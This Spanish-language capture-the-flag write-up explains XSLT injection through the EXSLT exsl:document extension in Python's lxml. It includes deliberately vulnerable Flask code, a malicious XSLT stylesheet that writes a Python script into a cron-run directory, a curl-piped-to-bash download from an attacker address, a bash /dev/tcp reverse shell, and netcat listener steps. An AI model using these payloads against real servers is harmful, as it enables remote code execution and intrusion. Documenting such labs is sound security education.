# XSLT Injection: Arbitrary File Write via EXSLT

## 📋 Índice
- [Descripción](#descripción)
- [Conceptos Previos](#conceptos-previos)
- [La Vulnerabilidad](#la-vulnerabilidad)
- [Escenario del CTF](#escenario-del-ctf)
- [Explotación Paso a Paso](#explotación-paso-a-paso)
- [Mitigaciones](#mitigaciones)
- [Referencias](#referencias)

---

## Descripción

**XSLT Injection** es una vulnerabilidad que ocurre cuando una aplicación procesa hojas de estilo XSLT controladas por el usuario sin las validaciones adecuadas. En este caso específico, explotamos la extensión **EXSLT** (`exsl:document`) para escribir archivos arbitrarios en el sistema de archivos del servidor.

---

## Conceptos Previos

### ¿Qué es XSLT?

**XSLT** (eXtensible Stylesheet Language Transformations) es un lenguaje de programación escrito en XML diseñado para transformar documentos XML en otros formatos (HTML, texto, otro XML, etc.).

```xml
<!-- Ejemplo básico de XSLT -->
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <html>
            <body>
                <h1><xsl:value-of select="//nombre"/></h1>
            </body>
        </html>
    </xsl:template>
</xsl:stylesheet>
```

### ¿Qué es libxml2?

**libxml2** es la biblioteca C subyacente que utilizan muchos parsers XML, incluyendo `lxml` en Python. Proporciona soporte para XML, XSLT, XPath, y más.

### ¿Qué es EXSLT?

**EXSLT** (Extensions to XSLT) es un conjunto de extensiones que añaden funcionalidades adicionales a XSLT, como:
- Funciones de fecha/hora
- Manipulación de strings
- **`exsl:document`**: Permite escribir múltiples archivos de salida

### La Función Peligrosa: `exsl:document`

```xml
<exsl:document href="/ruta/archivo.txt" method="text">
    Contenido a escribir
</exsl:document>
```

Esta función permite al procesador XSLT **escribir archivos en el sistema de archivos** con los permisos del usuario que ejecuta la aplicación (típicamente `www-data` o similar).

---

## La Vulnerabilidad

### Código Vulnerable

```python
from lxml import etree
from flask import Flask, request, session, redirect, url_for

app = Flask(__name__)

@app.route('/convert', methods=['POST'])
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    
    try:
        # ⚠️ VULNERABLE: Parser con protecciones solo para XML
        parser = etree.XMLParser(
            resolve_entities=False,
            no_network=True,
            dtd_validation=False,
            load_dtd=False
        )
        xml_tree = etree.parse(xml_path, parser)
        
        # ⚠️ CRÍTICO: XSLT parseado SIN restricciones
        xslt_tree = etree.parse(xslt_path)  # ← Aquí está el problema
        
        # Transformación XSLT
        transform = etree.XSLT(xslt_tree)
        result_tree = transform(xml_tree)
        result_html = str(result_tree)
        
        # ... código para guardar resultado ...
        
        return redirect(url_for('index'))
    except Exception as e:
        return f"Error: {e}"
```

### ¿Por Qué es Vulnerable?

1. **XML protegido**: El parser XML tiene configuraciones seguras (`resolve_entities=False`, `no_network=True`)
2. **XSLT desprotegido**: El archivo XSLT se parsea **sin ninguna restricción** en la línea `xslt_tree = etree.parse(xslt_path)`
3. **EXSLT habilitado**: Por defecto, `lxml` tiene soporte para EXSLT, incluyendo `exsl:document`

**Resultado:** Un atacante puede subir un XSLT malicioso que utilice `exsl:document` para escribir archivos arbitrarios en el servidor.

---

## Escenario del CTF

### Reconocimiento

Durante el reconocimiento, descubrimos información clave en el repositorio de la aplicación:

```bash
# README.md o comentarios en el código
# Cron job ejecutándose cada minuto:
***** www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

**Interpretación:**
- Cada minuto, un cron job ejecuta **todos los archivos `.py`** en `/var/www/conversor.htb/scripts/`
- Se ejecutan como usuario `www-data`
- ¡Podemos escribir un script Python malicioso ahí!

### Vector de Ataque

```
1. Subir XSLT malicioso con exsl:document
2. Escribir shell.py en /var/www/conversor.htb/scripts/
3. El cron ejecuta shell.py automáticamente
4. Obtenemos reverse shell
```

---

## Explotación Paso a Paso

### Paso 1: Preparar el Entorno del Atacante

Primero, creamos nuestro payload de reverse shell y lo servimos por HTTP:

```bash
# Crear el script de reverse shell
echo '#!/bin/bash' > shell.sh
echo 'bash -i >& /dev/tcp/10.10.14.15/9001 0>&1' >> shell.sh

# Verificar el contenido
cat shell.sh
```

**Resultado:**
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.15/9001 0>&1
```

**Iniciar servidor HTTP:**
```bash
python3 -m http.server 8000
```

### Paso 2: Configurar el Listener

En otra terminal, preparamos el listener para recibir la conexión:

```bash
nc -lvnp 9001
```

**Salida esperada:**
```
Listening on 0.0.0.0 9001
```

### Paso 3: Crear el Payload XSLT

**Archivo: `exploit.xslt`**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common"
    extension-element-prefixes="exsl">
    
    <xsl:template match="/">
        <exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("curl http://10.10.14.15:8000/shell.sh | bash")
        </exsl:document>
    </xsl:template>
    
</xsl:stylesheet>
```

**Desglose del Payload:**

- `xmlns:exsl="http://exslt.org/common"`: Importa el namespace EXSLT
- `extension-element-prefixes="exsl"`: Habilita las extensiones EXSLT
- `<exsl:document href="...">`: Define dónde escribir el archivo
- `method="text"`: Escribe como texto plano (no XML)
- **Contenido**: Script Python que descarga y ejecuta nuestro `shell.sh`

### Paso 4: Crear el XML Dummy

Necesitamos un XML válido para acompañar el XSLT:

**Archivo: `payload.xml`**

```xml
<?xml version="1.0"?>
<root>
    <data>test</data>
</root>
```

### Paso 5: Subir los Archivos

Accedemos a la aplicación web y subimos:
1. **XML File**: `payload.xml`
2. **XSLT File**: `exploit.xslt`

### Paso 6: Verificar en el Servidor HTTP

En tu servidor HTTP deberías ver:

```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### Paso 7: Esperar el Cron Job

El cron se ejecuta cada minuto. Después de máximo **60 segundos**, verás:

**En el servidor HTTP:**
```
10.10.11.x - - [31/Oct/2024 15:23:45] "GET /shell.sh HTTP/1.1" 200 -
```

**En el listener de netcat:**
```
Connection received on 10.10.11.x 54321
www-data@conversor:/$
```

¡**Shell obtenida!** 🎉

### Paso 8: Post-Explotación

```bash
# Verificar usuario
whoami
# Output: www-data

# Buscar la flag
find / -name "flag.txt" 2>/dev/null
cat /flag.txt

# O mejorar la shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Diagrama del Ataque

```
┌─────────────────┐
│   Atacante      │
│  10.10.14.15    │
└────────┬────────┘
         │
         │ 1. Sube exploit.xslt + payload.xml
         ▼
┌─────────────────────────────────────┐
│  Aplicación Web Vulnerable          │
│  conversor.htb                      │
│                                     │
│  ┌───────────────────────────────┐ │
│  │ lxml procesa XSLT             │ │
│  │ exsl:document escribe archivo │ │
│  └───────────────────────────────┘ │
│                                     │
│  Archivo escrito:                   │
│  /var/www/conversor.htb/scripts/    │
│  └─ shell.py                        │
└─────────────────┬───────────────────┘
                  │
                  │ 2. Cron ejecuta shell.py
                  │    (cada minuto)
                  ▼
         ┌────────────────┐
         │  shell.py:     │
         │  curl attacker │
         │  | bash        │
         └────────┬───────┘
                  │
                  │ 3. Descarga shell.sh
                  │
         ┌────────▼───────┐
         │  bash -i >&    │
         │  /dev/tcp/...  │
         └────────┬───────┘
                  │
                  │ 4. Reverse shell
                  ▼
         ┌────────────────┐
         │   Atacante     │
         │   nc -lvnp     │
         └────────────────┘
```